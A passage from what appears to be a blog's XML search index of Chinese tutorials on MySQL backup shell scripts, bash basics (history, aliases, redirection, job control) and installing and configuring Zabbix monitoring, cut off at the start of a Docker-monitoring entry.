$eMailFileecho "-------------------------" &gt;&gt; $eMailFileTIME=$(date "-d 10 day ago" +%Y%m%d%H%M%S)StartTime=$(date "-d 1 day ago" +"%Y-%m-%d %H:%M:%S")echo “Delete 10 days before the log” &gt;&gt;$eMailFilemysql -u$user -p$userPWD -e "purge master logs before $&#123;TIME&#125;" &amp;&amp; echo "delete 10 days before log" |tee -a $eMailFile #删除10天前的2进制文件filename=`cat $mysqlDataDir/mysqld-bin.index |awk -F "/" '&#123;print $2&#125;'` # 2进制文件for i in $filenamedoecho "$StartTime start backup binlog" &gt;&gt; $eMailFilemysqlbinlog -u$user -p$userPWD -d $database --start-datetime="$StartTime" $mysqlDataDir/$i &gt;&gt; $daily_databakDir/daily$DATE.sql |tee -a $eMailFiledoneif [ $? = 0 ]then# 删除mtime&gt;32的增量日志备份文件find $daily_databakDir -name "*.log" -type f -mtime +32 -exec rm &#123;&#125; \; &gt; /dev/null 2&gt;&amp;1cd $daily_databakDirecho "Daily backup succeed" &gt;&gt; $eMailFileelseecho "Daily backup fail" &gt;&gt; $eMailFilemail -s "MySQL Backup" $eMail &lt; $eMailFile #备份失败之后发送邮件通知ficat $eMailFile &gt; $logFile# 删除mtime&gt;32的增量日志备份文件find $daily_databakDir -name "*.log" -type f -mtime +32 -exec rm &#123;&#125; \; &gt; /dev/null 2&gt;&amp; 删除完全备份脚本 123456789#!/bin/sh# Name:rmBackup# PS:Delete old Backup.# By:Cloudsoar# Last Modify:2012-05-10# 定义备份目录dataBackupDir=/srv/bakmysql# 删除mtime&gt;32的日志备份文件find $dataBackupDir -name "*.sql" -type f -mtime +32 -exec rm &#123;&#125; \; &gt; /dev/null 2&gt;&amp;1 添加可执行权限 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 123chmod +x mysqlfullbakchmod +x mysqldailybakchmod +x rmBackup]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 结构以及执行]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F4.%20shell%20%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8A%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[shell 结构以及执行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写第一个 shell 脚本 12[root@192 ~]# cd /usr/local/sbin[root@192 sbin]# vim first.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容 12345#!/bin/bash#this is my first script.#written by yanyi.dateecho "Hello woeld!" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;shell 脚本通常都是以 .sh 为后缀的。这个并不是说不带 .sh 这个脚本就不能执行，只是大家的一个习惯。所以，以后发现了 .sh 为后缀的文件那么它可能是一个 shell 脚本。first.sh 中第一行要以 “#!/bin/bash” 开头，代表的意思是，该文件使用的是 bash 语法。如果不设置该行，虽然 shell 脚本也可以执行，但是不符合规范。如果把这个脚本放到一个默认 shell 并非 bash 的系统里，那么这个脚本很有可能是不能成功执行的，因为 bash 和其他的 shell 不兼容。 # 表示注释，这个符号后面跟一些该脚本的相关注释内容以及作者和创建日期或者版本等。当然这些注释并非必须的，也可以省略掉，但是不建议省略。因为随着工作时间的逐渐过渡，很有肯能忘记该脚本是用来干什么的，以及什么时候写的。所有写上注释是有必要的。另外，系统管理员并非只有有一个人，如果是其他管理员查看脚本，看不懂会很郁闷。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行脚本 1[root@192 sbin]# sh first.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实 shell 脚本还有另一种执行方法： 1[root@192 sbin]# ./first.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要使用另一种方法运行 shell 脚本，前提是脚本本身有执行权限。所以，需要给脚本加一个 x 权限。另外使用 sh 命令去执行一个 shell 脚本的时候是可以加 -x 选项来查看这个脚本执行过程的，这样有利于我们调试这个脚本哪里出了问题： 1[root@192 sbin]# sh -x first.sh]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 中的特殊符号]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F3.%20shell%20%E4%B8%AD%E7%9A%84%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[shell 中的特殊符号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;shell中常用到的特殊字符。 * 代表零个或多个任意字符 1234[root@localhost 111]# ls1 11.txt 1.txt 22.txt 2.txt 33.txt 3.txt 44.zip 55.zip[root@localhost 111]# ls *.txt11.txt 1.txt 22.txt 2.txt 33.txt 3.txt ？ 只代表一个任意的字符 1234[root@localhost 111]# ls1 11.txt 1.txt 22.txt 2.txt 33.txt 3.txt 44.zip 55.zip[root@localhost 111]# ls ?.txt1.txt 2.txt 3.txt # 注释符号 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个符号在linux中表示注释说明的意思，即#后面的内容linux忽略掉。 123[root@localhost ~]# abc=123 #aaa[root@localhost ~]# echo $abc123 \ 脱意字符 它将后面的特殊符号（例如“*”）还原为普通字符。 12[root@localhost ~]# ls -d test\*ls: 无法访问test*: 没有那个文件或目录 | 管道符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它的作用在于将符号前面命令的结果丢给符号后面的命令。这里提到的后面命令，并不是所有的命令都可以的，一般针对文档操作的命令比较常用，例如 cat , less , head , tail , greo , cut , sort , wc , unip , tee , tr , split , sed , awk 等等，其中grep ，sed ，awk 为正则表达式。 12[root@localhost ~]# cat /etc/passwd|wc -l21 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;wc -l用来计算一个文档有多少行。 特殊符号 $ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$ 除了用于变量前面的标识符外，还有一个妙用，就是和“!”结合起来使用。 12345[root@localhost ~]# ls 1.py1.py[root@localhost ~]# ls !$ls 1.py1.py &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;!$ 表示上条命令中最后一个变量（总之就是上条命令中最后出现的那个东西）例如上边命令最后是 1.py 那么在当前命令下输入 !$ 则代表 1.py 特殊符号 ； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;平时在一行中敲一个命令，然后回车就运行了，那么在一行中运行两个或两个以上的命令则需要在命令之间加一个“；” 123[root@localhost ~]# ls *.py;touch 4.py;ls *.py1.py 2.py 3.py1.py 2.py 3.py 4.py 特殊符号 ~ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户的家目录。如果是root则是/root。普通用户则是/home/username 1234567[root@localhost ~]# cd ~[root@localhost ~]# pwd/root[root@localhost ~]# su test[test@localhost root]$ cd ~[test@localhost ~]# pwd/home/test 特殊符号 &amp; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想把一条命令放到后台执行的话，则需要加上“&amp;”这个符号。通常用于时间非常长的情况。 1234[root@localhost ~]# sleep 100 &amp;[2] 2393[root@localhost ~]# jobs[1]+ 运行中 sleep 100 &amp; 重定向符号 &gt; &gt;&gt; 2&gt; 2&gt;&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重定向符号&gt;以及&gt;&gt;,分别表示取代和追加的意思。然后还有两个符号就是2&gt;和2&gt;&gt;，分别表示错误重定向和错误追加重定向。当运行一个命令报错时，报错信息会输出到当前的屏幕，如果想重定向到一个文本里，则要用2&gt;或者2&gt;&gt;。 12345678[root@localhost ~]# ls aaaals: 无法访问aaaa: 没有那个文件或目录[root@localhost ~]# ls aaaa 2&gt; /tmp/error[root@localhost ~]# cat /tmp/errorls: 无法访问aaaa: 没有那个文件或目录[root@localhost ~]# ls aaaa 2&gt;&gt; /tmp/errror[root@localhost ~]# cat /tmp/errorls: 无法访问aaaa: 没有那个文件或目录 中括号 [] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;中间为字符组合，代表中间字符中的任意一个。 123456[root@localhost ~]# ls *.py1.py 2.py 3.py 4.py[root@localhost ~]# ls [1-3].py1.py 2.py 3.py[root@localhost ~]# ls [0-9].py1.py 2.py 3.py 4.py]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 脚本介绍]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F1.%20shell%20%E8%84%9A%E6%9C%AC%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[shell 脚本介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Shell 脚本在 linux 系统管理员的运维工作中非常重要。它是一个脚本，并不能作为正式的编程语言。因为是跑在 linux 的shell 中，所以叫 shell 脚本。说白了， shell 脚本就是一些命令的合集。例如 进入到 /tmp/ 目录； 列出当前目录中所有的文件名； 把所有当前的文件拷贝到 /root/ 目录下； 删除当前目录下所有文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简单的四步在 shell 窗口中需要敲 4 个命令，按 4 次回车。当然这 4 步操作非常简单，如果是更加复杂的命令设置需要几十次操作，那样一次一次敲键盘会很麻烦。所以把所有的操作都记录到一个文档中，然后去调用文档中的命令，这样一步操作就可以完成。这个文档就是 shell 脚本，只是这个 shell 脚本有它的特殊格式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;shell 脚本能让运维人员很方便的去管理服务器，因为可以指定一个任务计划定时去执行某一个 shell 脚本实现想要的需求。这对于 linux 系统管理员来说是一件非常值得自豪的事情。现在邮箱很好用，发邮件的同时还可以发一条邮件通知的信息给用户，利用这点，就可以在 linux 服务器上部署监控的 shell 脚本。比如，网卡流量有异常了或者服务器 web 服务器停止服务了，就可以发一封邮件给管理员，同时发送给管理员一个告警短信。这样就可以及时知道服务器出问题了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在正式写 shell 脚本之前，凡是自定义的脚本建议放到 /usr/local/sbin/ 目录下。这样做的目的是，一来可以更好的管理文档，二来为以后使用的人提供方便，知道自定义脚本放在哪里，方便维护。]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 特性]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F2.%20shell%20%E7%89%B9%E6%80%A7%2F</url>
    <content type="text"><![CDATA[shell 特性命令历史&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;敲过的命令，Linux 是会有记录的，预设可以记录1000条历史命令。这些命令保存在用户的家目录中的 .bash-history 文件中。只有当用户正常退出当前的 shell 时，在当前 shell 中运行的命令才会保存至 .bash_history 文件中。 环境变量 HISTSIZE：命令历史记录的条数； HISTFILE：~/.bash_history HISTFILESIZE：命令历史文件记录历史的条数 HISTTIMEFORMAT：命令的时间戳。这个环境变量需设置，这个功能只能在这个变量被设置之后，那些新执行的 bash 命令才会被打上正确的时间戳。在此之前的所有命令，都将会显示成设置 HISTTIMEFORMAT 变量的时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置 HISTTIMEFORMAT 1export HISTTIMEFORMAT='%F %T' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看历史命令的时间戳 12345history | more1 2008-08-05 19:02:39 service network restart2 2008-08-05 19:02:39 exit3 2008-08-05 19:02:39 id4 2008-08-05 19:02:39 cat /etc/redhat-release history 参数 history [n] n为数字，列出最近的n条命令 -c 将目前shell中的所有history命令消除 history [-raw] histfiles -a 将目前新增的命令写入histfiles, 默认写入~/.bash_history -r 将histfiles内容读入到目前shell的history记忆中 -w 将目前history记忆的内容写入到histfiles 调用历史中的命令命令：!!&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两个连续的 “!”，表示执行上一条命令 12345[root@localhost ~]# pwd/root[root@localhost ~]# !!pwd/root 命令：!n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;”!n”，这里的 n 是数字，表示执行命令历史中第 n 条指令 1234567891011[root@localhost ~]# history.......1058 vim .bashrc1059 pwd1060 history[root@localhost ~]# !1059pwd/root 命令：”!字符串”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;”!字符串”（字符串大于等于1），以 p 为例，执行命令历史中最近一次 p 开头的命令 123[root@localhost ~]# !ppwd/root 别名 alias&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;别名 alias 也是 bash 所特有的功能之一。可以通过 alias 把一个常用的并且很长的指令别名成简介易记的指令。不想用了还可以用 unalias 解除别名功能。直接敲 alias 会看到目前系统预设的 alias 1234567891011[root@localhost ~]# aliasalias cp='cp -i'alias egrep='egrep --color=auto'alias fgrep='fgrep --color=auto'alias grep='grep --color=auto'alias l.='ls -d .* --color=auto'alias ll='ls -l --color=auto'alias ls='ls --color=auto'alias mv='mv -i'alias rm='rm -i'alias which='alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde' 语法1alias [命令别名]=['具体的命令'] 命令格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;给命令自定义一个名字，当前 shell 有效 123[root@localhost ~]# alias denny='pwd'[root@localhost ~]# denny/root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;取消命令别名 123[root@localhost ~]# unalias denny[root@localhost ~]# denny-bash: denny: command not found 通配符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“*” 匹配零个或多个字符 1234[root@localhost 111]# ls1 11.txt 1.txt 22.txt 2.txt 33.txt 3.txt 44.zip 55.zip[root@localhost 111]# ls *.txt11.txt 1.txt 22.txt 2.txt 33.txt 3.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“？”匹配一个字符 1234[root@localhost 111]# ls1 11.txt 1.txt 22.txt 2.txt 33.txt 3.txt 44.zip 55.zip[root@localhost 111]# ls ?.txt1.txt 2.txt 3.txt 输入输出重定向（&gt;,&gt;&gt;,&lt;,2&gt;,2&gt;&gt;）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入重定向用于改变命令的输入，输出重定向用于改变命令的输出。输出重定向更为常用，经常用于将命令的结果输入到文件中，而不是屏幕上。输入重定向的命令是 &lt;，输出重定向是命令是 &gt;，另外还有追加重定向&gt;&gt;，以及错误重定向2&gt;。 命令：&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出重定向，把文件里的内容删掉，写入新的。 12345[root@localhost 111]# cat 1.txt1111[root@localhost 111]# echo '222'&gt;1.txt[root@localhost 111]# cat 1.txt222 命令：&gt;&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;追加重定向，在文件原来的基础上在下面继续写入。 1234[root@localhost 111]# echo '333'&gt;&gt;1.txt[root@localhost 111]# cat 1.txt222333 命令：&lt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入重定向，把文件的内容输入到前面 12[root@localhost 111]# wc -l&lt;1.txt2 命令：2&gt;,2&gt;&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;错误重定向；追加错误重定向。把错误的内容重定向或追加重定向到文件中去 12345678[root@localhost 111]# ls 5 2&gt; 1.txt[root@localhost 111]# cat 1.txtls: 无法访问5: 没有那个文件或目录[root@localhost 111]# ls 5 2&gt;&gt; 1.txt[root@localhost 111]# cat 1.txtls: 无法访问5: 没有那个文件或目录ls: 无法访问5: 没有那个文件或目录 管道符“|”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;管道符“|”，就是把前面的命令运行的结果丢给后面的命令去处理 1234[root@localhost ~]# cat 1.py|wc -l6[root@localhost ~]# cat /etc/passwd|wc -l21 作业控制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当运行一个进程时，可以使它暂停（ctrl+z），然后使用fg命令恢复它，利用bg命令使它到后台运行，也可以终止它（ctrl+c）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 vim 编辑 test1.txt 。随便输入一些内容，按“ESC”后，使用“ctrl+z”使任务暂停 123[root@localhost ~]# vim test1.txt[1]+ 已停止 vim test1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到提示“vim test1.txt”已停止了，然后使用 fg 命令恢复它，此时就进入刚才的 vim 窗口了。使用“ctrl+c”直接终止 vim 任务。 命令：jobs&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看暂停的进程 123456[root@localhost ~]# sleep 100^Z[2]+ 已停止 sleep 100[root@localhost ~]# jobs[1]- 已停止 vim test1.txt[2]+ 已停止 sleep 100 命令 fg；fg [编号]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;恢复暂停进程，标号后面带加号的优先恢复，减号其次，也可以恢复指定暂停中的进程 12345678[root@localhost ~]# jobs[1]- 已停止 vim test1.txt[2]+ 已停止 sleep 100[root@localhost ~]# fg 1[1]+ 已停止 vim test1.txt[root@localhost ~]# jobs[1]+ 已停止 vim test1.txt[2]- 已停止 sleep 100 命令：bg；bg [编号]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后台运行暂停的进程，编号后面带加号的有限后台运行，减号其次，也可以指定后台运行暂停中的某个进程，&amp; 表示后台运行 12345678[root@localhost ~]# jobs[1]+ 已停止 vim test1.txt[2]- 已停止 sleep 100[root@localhost ~]# bg 2[2]- sleep 100 &amp;[root@localhost ~]# jobs[1]+ 已停止 vim test1.txt[2]- 完成 sleep 100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;丢到后台的任务如何关掉？如果没有退出刚才的 shell 那么先使用 “fg 编号”把任务调到前台，然后使用“ctrl+c”结束任务 命令：ps&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 &amp; 把任务丢如后台运行，可以使用 ps aux 命令找到那个进程，结束该进程需要使用 kill 命令 123[root@localhost ~]# ps aux|grep vimroot 2307 0.0 0.2 151464 4996 pts/0 T 11:35 0:00 vim test1.txtroot 2349 0.0 0.0 112664 972 pts/0 S+ 12:34 0:00 grep --color=auto vim 命令：kill&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果关闭当前的 shell ，再次打开另一个 shell 时，使用 jobs 命令并不能显示后台运行或者被暂停的任务，要想停掉它们，则需要先知道起PID，然后使用 kill 命令杀死那个进程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 &amp; 把任务丢到后台运行，会显示 pid 信息。忘记这个 pid 使用 ps aux 命令查找 12345[root@localhost ~]# vmstat 1 &gt; /tmp/1.log &amp;[2] 2351[root@localhost ~]# ps aux | grep vmstatroot 2351 0.0 0.0 148308 1348 pts/0 S 12:38 0:00 vmstat 1root 2353 0.0 0.0 112664 972 pts/0 S+ 12:38 0:00 grep --color=auto vmstat kill 命令语法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;kill 命令语法很简单，直接在后面加上 pid 即可，如果遇到杀不死的进程可以在 kill 后面加一个选项 1kill -9 [pid]]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix 增加客户端监控]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F3.%20zabbix%20%E5%A2%9E%E5%8A%A0%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9B%91%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[zabbix 增加客户端监控&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix 比 nagios 好的地方就是， zabbix 不需要命令行去配置，只需要在浏览器里面点点按钮就可以了，这样就直观和方便很多。在配置客户端之前，也需要在客户端上安装 zabbix。 1yum install -y zabbix20-agent &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后更改客户端机器上的 zabbix_agentd.conf 配置文件 1vim /etc/zabbix_agentd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 服务端 ip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为（自定义，但必须唯一） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动客户端 1/etc/init.d/zabbix-agent start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;服务端上命令行测试 12[root@zabbix ~]# zabbix_get -s 192.168.0.98 -p10050 -k "system.hostname"lnmp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在 web 界面下，点 configura（配置） –&gt; host（主机） 右上角点 create host （创建主机）其中 host name（主机名称） ，visible name（可见的名称） 自定义 ，可以选择 groups（组），这里默认即可， ip address（ip地址）写入客户端 ip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还可以配置监控项目模版： 点 “templates”（模版） ，点 add （添加），在弹出的小窗口中选择 Template OS Linux ，然后点 select（选择），最后点 save（存档） ，这些模块肯定是不能满足需求的，所以可以自定义监控模版。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix 自带了很多模版，模版中有很多监控项目，比如 CPU、网卡、内存、进程等等。使用系统自带模版有点太多了，所以可以自定义模版。点 configuration（配置） 选择 templates（模版） ，点右上角的 cteate template（创建模版）。 Template name（模版名称） 和 Visible name（可见的名称） 自定义，Groups（组） 选择 templates ，点 save存档 。然后去挑选一些项目拷贝到该模版下：比如找到 Templates OS Linux 点一下 items（项目） ，选择想要的项目，然后在下面选择 copy selected to …（复制所选的到…） 然后点 go（确认） 。Group 选择 templates ，找到刚才自定义的 templates ， 点 copy 。然后点 configuration（配置）选择 templates 可以看到新建的 templates 中已经有刚刚 copy 的 items 了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用和上面相同的方法自定义拷贝 Triggers（触发器），它用来设置告警的阀值，当然也可以自定义编辑它]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix 服务端安装]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F2.%20zabbix%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[zabbix 服务端安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix 是另外一个用得比较多的监控工具，同样也需要 apache+php 的支持，但它比 nagios 要多一个 mysql ，因为它有数据需要储存。所以，安装 zabbix，必须要安装 mysql 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安装 zabbix 之前，也需要安装 epel 扩展源，因为 centos 自带 yum 源是没有 zabbix 的。 1[root@zabbix ~]# yum install -y epel-release &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装 rpm 包的 lamp 环境 1[root@zabbix ~]# yum install -y httpd mysql mysql-libs php php-mysql mysql-server php-bcmath php-gd php-mbstring &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装 zabbix 服务端 1[root@zabbix ~]# yum install -y zabbix30 zabbix30-agent zabbix30-server zabbix30-server-mysql zabbix30-web zabbix30-web-mysql net-snmp-devel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装好以后，就可以启动服务了 123[root@zabbix ~]# service zabbix-server start[root@zabbix ~]# service zabbix-agent start[root@zabbix ~]# service httpd start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改一下 mysql 配置 1[root@zabbix ~]# vim /etc/my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改或增加内容 1234[mysql]default-character-set = utf8[mysqld]character_set_server = utf8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后启动 mysql 服务 1[root@zabbix ~]# /etc/init.d/mysqld start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后建库，导入数据 1234[root@zabbix ~]# mysql -uroot -e "create database zabbix"[root@zabbix ~]# mysql -uroot --default-character-set=utf8 zabbix &lt; /usr/share/zabbix-mysql/schema.sql[root@zabbix ~]# mysql -uroot --default-character-set=utf8 zabbix &lt; /usr/share/zabbix-mysql/images.sql [root@zabbix ~]# mysql -uroot --default-character-set=utf8 zabbix &lt; /usr/share/zabbix-mysql/data.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时发现 zabbix_server 并没有启动起来 1[root@zabbix ~]# mysql -uroot -e "grant all on *.* to 'zabbix'@'localhost' identified by 'zabbix';" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑 /etc/zabbix/zabbix_server.conf 1[root@zabbix ~]# vim /etc/zabbix/zabbix_server.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置 DBUser，DBPasseord &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后重启 zabbix-server 服务 1[root@zabbix ~]# /etc/init.d/zabbix-server restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再次查看 zabbix_server 服务已启动 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面通过浏览器安装 zabbix &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器访问 http://ip/zabbix ，默认会有 “It is not safe to rely on the system‘s timezone settings ” 这样的警告信息 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要 1[root@zabbix ~]# vim /etc/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点 next，会提示有一些参数不合适，需要通过编辑配置文件 /etc/php.ini ，解决相关的报错信息 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改完成，重启 apache 服务 1[root@zabbix ~]# service httpd restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点 retry，所有参数提示 OK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点 next &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入 mysql 相关配置，点 test connection 测试 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示 OK，点 next &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Name 写 127.0.0.1 （这个可以自定义） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;继续点 next &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再点 next &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点 finish ，进入登录页面，默认帐号 admin 密码 zabbix &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入帐号密码登录]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式系统监视 zabbix]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F1.%20%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%9B%91%E8%A7%86%20zabbix%2F</url>
    <content type="text"><![CDATA[分布式系统监视Zabbix&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供柔软的通知机制以让系统管理员快速定位/解决存在的各种问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix由2部分构成，zabbix server与可选组件zabbix agent。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux, Solaris, HP-UX, AIX, Free BSD, Open BSD, OS X等平台之上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix agent需要安装在被监视的目标服务器上，它主要完成对硬件信息或与操作系统有关的内存，CPU等信息的收集。zabbix agent可以运行在Linux ,Solaris, HP-UX, AIX, Free BSD, Open BSD, OS X, Tru64/OSF1, Windows NT4.0, Windows 2000/2003/XP/Vista)等系统之上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix server可以单独监视远程服务器的服务状态；同时也可以与zabbix agent配合，可以轮询zabbix agent主动接收监视数据（trapping方式），同时还可被动接收zabbix agent发送的数据（trapping方式）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外zabbix server还支持SNMP (v1,v2)，可以与SNMP软件(例如：net-snmp)等配合使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix的主要特点： 安装与配置简单，学习成本低 支持多语言（包括中文） 免费开源 自动发现服务器与网络设备 分布式监视以及WEB集中管理功能 可以无agent监视 用户安全认证和柔软的授权方式 通过WEB界面设置或查看监视结果 email等通知功能 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;等等 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Zabbix主要功能： CPU负荷 内存使用 磁盘使用 网络状况 端口监视 日志监视]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix自动发现实现批量监控docker状态]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F26.%20zabbix%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E7%9B%91%E6%8E%A7docker%E7%8A%B6%E6%80%81%2F</url>
